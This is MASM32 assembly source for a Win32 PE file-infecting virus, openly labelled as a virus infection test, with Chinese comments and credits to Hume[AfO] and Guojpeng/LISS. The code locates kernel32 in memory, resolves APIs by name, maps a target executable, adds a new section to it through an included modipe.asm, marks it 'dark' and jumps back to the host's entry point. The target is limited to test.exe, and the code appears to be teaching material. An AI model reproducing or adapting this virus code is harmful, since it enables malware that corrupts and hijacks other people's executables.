.586 
.model flat, stdcall 
option casemap :none  ; case sensitive 
include \masm32\include\windows.inc
include \masm32\include\comctl32.inc 
includelib \masm32\lib\comctl32.lib

GetApiA        proto    :DWORD,:DWORD 

;MyTest segment 
.CODE 
;---------------程序入口--------------------------
_Start0:
invoke InitCommonControls        	;此处在win2000下必须加入
jmp _Start
VirusLen        =  vEnd-vBegin          ;Virus 长度 
;-->>>>病毒代码开始位置，从这里到v_End的部分会附加在HOST程序中<<<<<--
vBegin:                                 ;真正的病毒部分从这里开始
;----------------------------------------- 
include s_api.asm             		   	;查找需要的api地址 
;-------------------以下为数据定义---------------------- 
desfile			db "test.exe",0 ;这里可自行指定感染目标。
fsize			dd ?
hFile			dd ?
hMap			dd ? 
pMem			dd ? 
;----------------------------------------- 
pe_Header		dd ? 
sec_align		dd ? 
file_align		dd ? 
newEip			dd ? 
oldEip			dd ? 
oldEipTemp      dd ?
inc_size		dd ? 
oldEnd          dd ? 
;------------定义MessageBoxA函数名称及函数地址存放位置---------------- 
sMessageBoxA	db "MessageBoxA",0 
aMessageBoxA	dd 0 
;作者定义的提示信息... 
sztit			db "病毒感染测试",0 
szMsg0 		db "病毒感染测试!",0 
CopyRight		db "The Example was First Offerred by Hume[AfO]",0dh,0ah 
                  db "Some bugs have been eliminated by Guojpeng/LISS, 2004",0dh,0ah
db "Only infect the file named test.exe of the current directory!",0dh,0ah
db "The add Code SiZe:(heX)" 
val             dd 0,0,0,0 
;;------------à>病毒真正入口位置<<--------------------------- 
_Start: 
call   _delta
_delta:
pop    ebp                         ;得到delta地址
sub    ebp,offset _delta           ;以便于后面变量重定位
mov    dword ptr [ebp+appBase],ebp
mov    eax,[esp]                   ;返回地址
xor    edx,edx 
getK32Base: 
dec    eax               ;逐字节比较验证，速度比较慢，不过功能一样
mov    dx,word  ptr [eax+IMAGE_DOS_HEADER.e_lfanew]  ;就是ecx+3ch
test   dx,0f000h         ;Dos Header+stub不可能太大,超过4096byte
jnz    getK32Base        ;加速检验，下一个
cmp    eax,dword ptr [eax+edx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
jnz    getK32Base        ;看Image_Base值是否等于ecx即模块起始值
mov    [ebp+k32Base],eax ;如果是,就认为找到kernel32的模块装入地址
lea    edi,[ebp+aGetModuleHandle] ;edi指向API函数地址存放位置
lea    esi,[ebp+lpApiAddrs] ;esi指向API函数名字串偏移地址（此地址需重定位）
lop_get: 
lodsd 
cmp    eax,0 
jz     End_Get 
add    eax,ebp
push   eax 			;此时eax中放着GetModuleHandleA函数名字串的偏移位置
push   dword ptr [ebp+k32Base]
call   GetApiA 
stosd
jmp    lop_get          ;获得api地址,参见s_api文件
End_Get: 
call   my_infect        ;获得各API函数地址后，开始调用感染模块
include dislen.asm 	    ;该文件中代码用来显示病毒文件的长度


CouldNotInfect:
lea    eax,[ebp+u32] 
push   eax 
call   dword ptr [ebp+aLoadLibrary]  ;导入user32.dll链接库
test   eax,eax 
jnz    @g12       
@g12: 
    lea    EDX,[EBP+sMessageBoxA] 
push   edx 
push   eax 
mov    eax,dword ptr [ebp+aGetProcAddress]  ;获取MessageBoxA函数的地址
call   eax 
mov    [ebp+aMessageBoxA],eax 

push 10040h
call No_caption
db "没有感染！",0
No_caption:
call _tips
db "本程序仅感染本目录下未被感染过的test.exe程序。",0
_tips:
push 0
call [ebp+aMessageBoxA]
 
_where:                                         
xor    eax,eax          ;判断是否是已经附加感染标志 'dark' 
push   eax 
call   [ebp+aGetModuleHandle];获得本启动（或HOST）程序的加载模块
mov    esi,eax 
add    esi,[esi+3ch]    ; esi->程序本身的Pe_header 
cmp    dword ptr [esi+8],'dark';判断是已经正在运行的HOST程序，还是启动程序？ 
je     jmp_oep 	              ;是HOST程序，控制权交给HOST
jmp    _xit                   ;调用启动程序的退出部分语句
jmp_oep: 
add    eax,[ebp+oldEip]         
jmp    eax                    ;跳到宿主程序的入口点

my_infect:        ;感染部分,文件读写操作,PE文件修改参见modipe.asm文件
xor    eax,eax 
push   eax 
push   eax 
push   OPEN_EXISTING 
push   eax 
push   eax 
push   GENERIC_READ+GENERIC_WRITE 
lea    eax,[ebp+desfile]      ;目标文件文件名字串偏移地址
push   eax 
call   [ebp+aCreateFile]      ;打开目标文件 
inc    eax                    ;如返回-1，则表示失败
je     _Err 
dec    eax 
mov    [ebp+hFile],eax        ;返回文件句柄

push   eax 
sub    ebx,ebx 
push   ebx 
push   eax            		  ;得到文件大小 
call   [ebp+aGetFileSize] 
inc    eax                    ;如返回-1，则表示失败
je      _sclosefile 
dec    eax 
mov    [ebp+fsize],eax 
xchg   eax,ecx 
add    ecx,1000h              ;文件大小增加4096bytes 
pop    eax
xor    ebx,ebx                ;创建映射文件
push   ebx           		  ;创建没有名字的文件映射
push   ecx           		 ;文件大小等于原大小+Vsize 
push   ebx             
push   PAGE_READWRITE 
push   ebx 
push   eax 
call   [ebp+aCreateFileMapping] 
test   eax,eax               ;如返回0则说明出错
je     _sclosefile           ;创建成功否?不成功，则跳转
mov    [ebp+hMap],eax        ;保存映射对象句柄
xor    ebx,ebx 
push   ebx 
push   ebx 
push   ebx 
push   FILE_MAP_WRITE     
push   eax 
call   [ebp+aMapViewOfFile] 
test   eax,eax               ; 映射文件,是否成功?
je     _sclosemap            ;返回0说明函数调用失败   
mov    [ebp+pMem],eax        ;保存内存映射文件首地址
;-------------------------------------------- 
; 下面是给HOST添加新节的代码
;-------------------------------------------- 
include modipe.asm           ;该文件中主要为感染目标文件的代码
_sunview: 
push   [ebp+pMem]
call   [ebp+aUnmapViewOfFile]
;解除映射，同时修改过的映射文件全部写回目标文件
_sclosemap: 
push   [ebp+hMap] 
call   [ebp+aCloseHandle] 	 ;关闭映射
_sclosefile: 
push   [ebp+hFile] 
call   [ebp+aCloseHandle]    ;关闭打开的目标文件
_Err: 
ret
;----------------------------------------- 
_xit:
push   0 
call   [ebp+aExitProcess]    ;退出启动程序 
vEnd:                            ;考虑一下：病毒末尾位置是否可以提前？
;MyTest ends
end  _Start0

